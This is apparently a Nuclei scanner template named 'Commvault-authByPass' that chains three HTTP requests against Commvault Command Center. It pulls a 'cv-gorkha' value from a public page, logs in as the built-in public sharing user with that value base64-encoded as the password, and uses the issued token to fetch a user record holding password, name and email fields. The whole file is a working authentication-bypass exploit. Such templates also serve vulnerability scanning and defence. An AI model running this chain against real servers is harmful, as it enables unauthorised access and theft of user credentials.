id: Commvault-authByPass

info:
  name: Commvault-authByPass
  author: iSee857
  severity: high
  description: |
    Commvault-authByPass

flow: |
  http(1) && http(2) && http(3)

http:
  - id: extract-cv-gorkha
    method: GET
    path:
      - "{{BaseURL}}/commandcenter/publicLink.do"
    extractors:
      - type: regex
        name: cv_gorkha_value
        part: body
        internal: true
        group: 1
        regex:
          - '"cv-gorkha":"([A-F0-9\\-]+)"'

    matchers:
      - type: status
        status:
          - 200

  - id: login-with-encoded-value
    method: POST
    path:
      - "{{BaseURL}}/commandcenter/api/Login"
    headers:
      Content-Type: application/json;charset=UTF-8
      Accept: application/json
    body: |
      {
        "username": "_+_PublicSharingUser_",
        "password": "{{base64(cv_gorkha_value)}}"
      }
    extractors:
      - type: regex
        name: auth_token
        part: body
        internal: true
        group: 1
        regex:
          - '"token":"([A-Za-z0-9+/=\\-]+)"'
    matchers-condition: or
    matchers:
      - type: status
        status:
          - 301
          - 307
      - type: status
        status:
          - 200

  - id: fetch-user-info
    method: GET
    path:
      - "{{BaseURL}}/commandcenter/RestServlet/Database/GetUmUserById/1"
    headers:
      Accept: application/xml
      Authtoken: "{{auth_token}}"
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - 'password'
          - 'name'
          - 'email'